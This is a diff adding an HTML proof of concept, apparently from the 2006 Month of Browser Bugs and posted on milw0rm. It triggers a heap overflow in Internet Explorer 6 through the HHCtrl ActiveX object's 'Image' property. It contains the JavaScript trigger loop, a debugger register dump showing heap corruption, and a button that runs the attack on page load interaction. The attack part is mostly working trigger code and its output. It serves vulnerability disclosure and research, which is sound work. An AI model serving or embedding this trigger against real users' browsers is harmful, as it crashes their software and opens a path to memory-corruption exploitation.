@@ -1,0 +1,49 @@
+<!--
+http://browserfun.blogspot.com/
+
+The following bug was tested on the latest version of Internet Explorer 6 
+on a fully-patched Windows XP SP2 system. This bug is interesting because 
+a small heap overflow occurs each time this property is set. The bug is difficult 
+to detect unless heap verification has been enabled in the global debug flags 
+for iexplore.exe. The demonstration below results in a possibly exploitable heap 
+corruption after 128 or more iterations of the property set.
+
+var a = new ActiveXObject("Internet.HHCtrl.1");
+var b = unescape("XXXX");
+while (b.length < 256) b += b;
+
+for (var i=0; i<4096; i++) {
+a['Image'] = b + "";
+}
+
+
+eax=00030288 ebx=00030000 ecx=7ffdd000
+edx=00030608 esi=58585850 edi=00000022
+eip=7c911f52 esp=0013afcc ebp=0013b1ec
+ntdll!RtlAllocateHeap+0x31b:
+7c911f52 8a4605 mov al,[esi+0x5] ds:0023:58585855=??
+
+-->
+
+<html><body><script>
+
+// MoBB Demonstration
+function Demo() {
+	var a = new ActiveXObject("Internet.HHCtrl.1");
+	var b = unescape("XXXX");
+	while (b.length < 256) b += b;
+	
+	for (var i=0; i<4096; i++) {
+        	a['Image'] = b + "";
+	}
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
+
+
+</body></html>
+
+# milw0rm.com [2006-07-07]
